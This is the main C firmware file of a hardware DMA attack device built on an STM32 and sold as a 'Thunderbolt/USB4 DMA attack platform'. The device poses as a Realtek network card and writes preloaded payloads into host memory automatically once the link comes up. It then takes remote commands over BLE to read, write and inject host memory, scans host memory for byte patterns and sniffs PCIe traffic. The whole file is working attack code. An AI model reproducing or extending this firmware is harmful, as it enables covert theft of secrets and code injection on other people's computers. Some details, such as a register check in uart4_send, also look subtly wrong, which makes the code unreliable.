/*
 * main.c — USB DMA Phantom main firmware
 * STM32F423CHU6-based Thunderbolt/USB4 DMA attack platform
 *
 * Copyright (c) 2026 Hacker Devices
 * SPDX-License-Identifier: MIT
 */

#include "board.h"
#include "registers.h"
#include "drivers/spi4.h"
#include "drivers/w25q128.h"
#include "drivers/xio2001.h"

/* ---- Global state ---- */
static volatile uint8_t  g_mode = MODE_STEALTH_DMA;
static volatile uint8_t  g_dma_active = 0;
static volatile uint32_t g_tick_ms = 0;
static uint8_t  g_rx_buf[256];    /* UART RX buffer */
static uint8_t  g_dma_buf[4096];  /* DMA transfer buffer */
static payload_descriptor_t g_payload_desc;

/* ---- SysTick interrupt (1 ms tick) ---- */
void SysTick_Handler(void) {
    g_tick_ms++;
}

/* ---- EXTI interrupt (mode button) ---- */
void EXTI15_10_IRQHandler(void) {
    if (EXTI->PR & (1UL << GPIOC_MODE_BTN)) {
        EXTI->PR = (1UL << GPIOC_MODE_BTN);
        /* Debounce: only act if held for > 50 ms */
        uint32_t start = g_tick_ms;
        while (!(GPIOC->IDR & (1UL << GPIOC_MODE_BTN))) {
            if ((g_tick_ms - start) > 50) {
                /* Button held — cycle mode */
                g_mode = (g_mode % MODE_SNIFFER) + 1;
                led_set_pattern(g_mode);
                break;
            }
        }
    }
}

/* ---- Delay functions ---- */
void delay_us(uint32_t us) {
    uint32_t start = g_tick_ms;
    /* Approximate: busy loop, 120 MHz core = 120 cycles/us */
    volatile uint32_t count = us * 30; /* ~4 cycles per iteration */
    while (count--) {
        __asm__ volatile ("nop");
    }
}

void delay_ms(uint32_t ms) {
    uint32_t start = g_tick_ms;
    while ((g_tick_ms - start) < ms);
}

/* ---- LED driver (WS2812B bit-bang) ---- */
static void ws2812_send_byte(uint8_t byte) {
    for (int i = 7; i >= 0; i--) {
        if (byte & (1 << i)) {
            /* 1-bit: high 700 ns, low 600 ns */
            GPIOC->ODR |= (1UL << GPIOC_WS2812_DATA);
            __asm__ volatile ("nop; nop; nop; nop; nop; nop; nop; nop;"
                              "nop; nop; nop; nop; nop; nop; nop; nop;"
                              "nop; nop; nop; nop; nop; nop; nop; nop;");
            GPIOC->ODR &= ~(1UL << GPIOC_WS2812_DATA);
            __asm__ volatile ("nop; nop; nop; nop; nop; nop; nop; nop;"
                              "nop; nop; nop; nop; nop; nop; nop; nop;");
        } else {
            /* 0-bit: high 350 ns, low 800 ns */
            GPIOC->ODR |= (1UL << GPIOC_WS2812_DATA);
            __asm__ volatile ("nop; nop; nop; nop; nop; nop; nop; nop;");
            GPIOC->ODR &= ~(1UL << GPIOC_WS2812_DATA);
            __asm__ volatile ("nop; nop; nop; nop; nop; nop; nop; nop;"
                              "nop; nop; nop; nop; nop; nop; nop; nop;"
                              "nop; nop; nop; nop; nop; nop; nop; nop;");
        }
    }
}

static void ws2812_update(uint8_t r, uint8_t g, uint8_t b) {
    /* WS2812B protocol: GRB order, reset pulse > 80 µs */
    ws2812_send_byte(g);
    ws2812_send_byte(r);
    ws2812_send_byte(b);
    /* Latch: hold low for > 80 µs */
    GPIOC->ODR &= ~(1UL << GPIOC_WS2812_DATA);
    delay_us(100);
}

static uint8_t led_r = 0, led_g = 0, led_b = 0;
static uint8_t led_pattern = LED_PATTERN_IDLE;

void led_init(void) {
    /* PC14 = output for WS2812B */
    GPIOC->MODER = (GPIOC->MODER & ~(0x3UL << (GPIOC_WS2812_DATA * 2)))
                 | (0x1UL << (GPIOC_WS2812_DATA * 2));
    GPIOC->ODR &= ~(1UL << GPIOC_WS2812_DATA);
    ws2812_update(0, 0, 0);  /* Off */
}

void led_set_pattern(uint8_t pattern) {
    led_pattern = pattern;
    switch (pattern) {
        case LED_PATTERN_IDLE:        led_r = 0;   led_g = 0;   led_b = 32;  break; /* Dim blue */
        case LED_PATTERN_DMA_ACTIVE:  led_r = 255; led_g = 0;   led_b = 0;   break; /* Red */
        case LED_PATTERN_BLE_CONN:    led_r = 0;   led_g = 255; led_b = 0;   break; /* Green */
        case LED_PATTERN_USB_CONN:    led_r = 0;   led_g = 255; led_b = 255; break; /* Cyan */
        case LED_PATTERN_ERROR:       led_r = 255; led_g = 0;   led_b = 0;   break; /* Red flash */
        case LED_PATTERN_CONFIG:      led_r = 255; led_g = 255; led_b = 0;   break; /* Yellow */
        default:                      led_r = 0;   led_g = 0;   led_b = 0;   break;
    }
    ws2812_update(led_r, led_g, led_b);
}

/* ---- Mode button ---- */
void mode_button_init(void) {
    /* PC13 = input with pull-up */
    GPIOC->MODER &= ~(0x3UL << (GPIOC_MODE_BTN * 2));
    GPIOC->PUPDR = (GPIOC->PUPDR & ~(0x3UL << (GPIOC_MODE_BTN * 2)))
                 | (0x1UL << (GPIOC_MODE_BTN * 2));  /* Pull-up */

    /* Configure EXTI line 13 for PC13 */
    SYSCFG->EXTICR[3] = (SYSCFG->EXTICR[3] & ~(0xFUL << ((13 % 4) * 4)))
                       | (0x2UL << ((13 % 4) * 4));  /* EXTI13 = PC13 */

    EXTI->IMR |= (1UL << 13);
    EXTI->FTSR |= (1UL << 13);   /* Falling edge trigger */
    EXTI->RTSR &= ~(1UL << 13);  /* No rising edge */

    /* Enable EXTI15_10 interrupt */
    NVIC->ISER[40 >> 5] = (1UL << (40 & 0x1F));
}

uint8_t mode_button_read(void) {
    return (GPIOC->IDR & (1UL << GPIOC_MODE_BTN)) ? 0 : 1;
}

/* ---- RNG (hardware random) ---- */
static void rng_init(void) {
    RCC->AHB2ENR |= RCC_AHB2ENR_RNGEN;
    RNG->CR |= RNG_CR_RNGEN;
}

uint32_t rng_get(void) {
    while (!(RNG->SR & RNG_SR_DRDY));
    return RNG->DR;
}

/* ---- UART4 (C2 link to nRF52832) ---- */
static void uart4_init(void) {
    /* Enable USART4 clock */
    RCC->APB1ENR |= RCC_APB1ENR_USART4EN;

    /* Baud rate: APB1_CLK / baud = 60 MHz / 1 Mbps = 60 */
    USART4->BRR = 60;

    /* 8N1, enable TX/RX, hardware flow control */
    USART4->CR1 = USART_CR1_UE | USART_CR1_TE | USART_CR1_RE | USART_CR1_RXNEIE;
    USART4->CR3 = USART_CR3_CTSE | USART_CR3_RTSE;

    /* Enable USART4 interrupt */
    NVIC->ISER[52 >> 5] = (1UL << (52 & 0x1F));
}

void uart4_send(uint8_t byte) {
    while (!(USART4->SR & USART_CR1_TXEIE));
    USART4->DR = byte;
}

uint8_t uart4_recv(void) {
    while (!(USART4->SR & (1UL << 5)));  /* RXNE */
    return (uint8_t)(USART4->DR & 0xFF);
}

void uart4_send_buf(const uint8_t *buf, uint16_t len) {
    for (uint16_t i = 0; i < len; i++) {
        uart4_send(buf[i]);
    }
}

/* ---- USART4 RX interrupt handler ---- */
static volatile uint16_t g_rx_idx = 0;
static volatile uint8_t  g_rx_ready = 0;

void USART4_IRQHandler(void) {
    if (USART4->SR & (1UL << 5)) {  /* RXNE */
        uint8_t byte = (uint8_t)(USART4->DR & 0xFF);
        if (g_rx_idx < sizeof(g_rx_buf)) {
            g_rx_buf[g_rx_idx++] = byte;
            /* Check for DMA magic + complete packet */
            if (byte == 0x0A || g_rx_idx >= 4) {
                g_rx_ready = 1;
            }
        }
    }
}

/* ---- DMA command processing ---- */
static int process_dma_command(const dma_packet_t *cmd) {
    dma_request_t req;

    /* Validate magic */
    if (cmd->magic != DMA_MAGIC) {
        return -1;
    }

    /* Build DMA request */
    req.command   = cmd->cmd;
    req.host_addr = cmd->host_addr;
    req.length    = cmd->length;
    req.local_buf = g_dma_buf;

    /* If write/inject, copy payload data to local buffer */
    if (cmd->cmd == DMA_CMD_WRITE || cmd->cmd == DMA_CMD_INJECT) {
        uint16_t data_offset = sizeof(dma_packet_t);
        uint16_t data_len = cmd->length;
        if (data_len > sizeof(g_dma_buf)) {
            return -2;
        }
        memcpy(g_dma_buf, &cmd->data[0], data_len);
    }

    /* Execute DMA operation via XIO2001 */
    int result = xio_dma_execute(&req);

    /* For read operations, send data back via UART/BLE */
    if (cmd->cmd == DMA_CMD_READ && result == 0) {
        /* Send response header */
        uart4_send(DMA_RESP_OK);
        uart4_send(cmd->seq);
        uart4_send((cmd->length >> 8) & 0xFF);
        uart4_send(cmd->length & 0xFF);
        /* Send data */
        uart4_send_buf(g_dma_buf, cmd->length);
    } else if (result != 0) {
        uart4_send(DMA_RESP_ERR);
        uart4_send(cmd->seq);
        uart4_send((uint8_t)(-result));
    }

    return result;
}

/* ---- Memory scan (pattern search in host physical memory) ---- */
static int dma_scan_memory(uint64_t start, uint64_t end,
                            const uint8_t *pattern, uint16_t pat_len,
                            uint64_t *found_addr) {
    uint32_t chunk_size = 256;  /* Read 256 bytes at a time */
    dma_request_t req;
    req.command   = DMA_CMD_READ;
    req.length    = chunk_size;
    req.local_buf = g_dma_buf;

    for (uint64_t addr = start; addr < end; addr += chunk_size) {
        req.host_addr = addr;
        int result = xio_dma_execute(&req);
        if (result != 0) continue;

        /* Search for pattern in chunk */
        for (uint16_t i = 0; i <= chunk_size - pat_len; i++) {
            if (memcmp(&g_dma_buf[i], pattern, pat_len) == 0) {
                *found_addr = addr + i;
                return 0;
            }
        }
    }
    return -1;  /* Not found */
}

/* ---- Main ---- */
int main(void) {
    /* 1. Clock initialization */
    clock_init();

    /* 2. GPIO initialization */
    gpio_init();

    /* 3. SysTick: 1 ms tick at 120 MHz */
    SysTick->LOAD = 120000UL - 1;
    SysTick->VAL = 0;
    SysTick->CTRL = SysTick_CTRL_ENABLE | SysTick_CTRL_CLKSOURCE;

    /* 4. Initialize peripherals */
    spi4_init();
    rng_init();
    led_init();
    mode_button_init();
    uart4_init();

    /* 5. Initialize W25Q128 flash */
    w25q_init();
    uint32_t jedec_id = w25q_read_jedec_id();
    if (jedec_id != 0xEF4018) {
        /* Flash not found or wrong device */
        led_set_pattern(LED_PATTERN_ERROR);
        while (1);
    }

    /* 6. Load payload descriptor */
    if (!w25q_load_payload_descriptor(&g_payload_desc)) {
        /* No valid descriptor — use defaults */
        g_payload_desc.magic = PAYLOAD_MAGIC;
        g_payload_desc.vid = 0x10EC;  /* Realtek */
        g_payload_desc.pid = 0x8168;  /* RTL8111 (common NIC) */
        g_payload_desc.payload_count = 0;
    }

    /* 7. Initialize XIO2001 PCIe bridge */
    xio_init(g_payload_desc.vid, g_payload_desc.pid);

    /* 8. Initialize HD3SS460 USB-C mux */
    hd3ss460_init();

    /* 9. Release XIO2001 PERST# to start PCIe link training */
    GPIOC->ODR |= (1UL << GPIOC_XIO_PERST);  /* Deassert PERST# */

    /* 10. Set initial mode based on button */
    if (mode_button_read()) {
        g_mode = MODE_CONFIG;
        led_set_pattern(LED_PATTERN_CONFIG);
    } else {
        g_mode = MODE_STEALTH_DMA;
        led_set_pattern(LED_PATTERN_IDLE);
    }

    /* 11. Main loop */
    while (1) {
        switch (g_mode) {
            case MODE_STEALTH_DMA:
                /* Wait for XIO2001 link to come up, then auto-execute payloads */
                if (xio_is_link_up() && !g_dma_active) {
                    g_dma_active = 1;
                    led_set_pattern(LED_PATTERN_DMA_ACTIVE);

                    /* Execute preloaded payloads from flash */
                    for (uint8_t i = 0; i < g_payload_desc.payload_count; i++) {
                        if (w25q_verify_payload_hmac(i)) {
                            uint32_t offset = PAYLOAD_OFFSET_BASE +
                                            g_payload_desc.payload_offsets[i];
                            uint32_t size = g_payload_desc.payload_sizes[i];

                            /* Load payload into DMA buffer */
                            w25q_read(offset, g_dma_buf,
                                     (size > sizeof(g_dma_buf)) ?
                                     sizeof(g_dma_buf) : size);

                            /* Execute as DMA write to host */
                            dma_request_t req = {
                                .host_addr = 0,  /* Default target */
                                .length = size,
                                .command = DMA_CMD_WRITE,
                                .local_buf = g_dma_buf,
                            };
                            xio_dma_execute(&req);
                        }
                    }

                    /* Transition to interactive mode after payload execution */
                    g_mode = MODE_INTERACTIVE;
                    led_set_pattern(LED_PATTERN_BLE_CONN);
                }
                break;

            case MODE_INTERACTIVE:
                /* Process commands from UART (BLE C2) */
                if (g_rx_ready) {
                    dma_packet_t *cmd = (dma_packet_t *)g_rx_buf;
                    process_dma_command(cmd);
                    g_rx_idx = 0;
                    g_rx_ready = 0;
                }
                break;

            case MODE_CONFIG:
                /* USB CDC mode — handled by USB OTG interrupt */
                /* For now, just process UART commands */
                if (g_rx_ready) {
                    dma_packet_t *cmd = (dma_packet_t *)g_rx_buf;
                    process_dma_command(cmd);
                    g_rx_idx = 0;
                    g_rx_ready = 0;
                }
                break;

            case MODE_SNIFFER:
                /* Passive PCIe TLP sniffing */
                if (xio_is_link_up()) {
                    xio_sniff_tlps(g_dma_buf, sizeof(g_dma_buf));
                }
                break;
        }

        /* LED animation for patterns that pulse */
        if (led_pattern == LED_PATTERN_DMA_ACTIVE ||
            led_pattern == LED_PATTERN_ERROR) {
            /* Blink effect */
            if ((g_tick_ms % 500) < 250) {
                ws2812_update(led_r, led_g, led_b);
            } else {
                ws2812_update(0, 0, 0);
            }
        }

        /* Power management: WFI when idle */
        __asm__ volatile ("wfi");
    }

    return 0;
}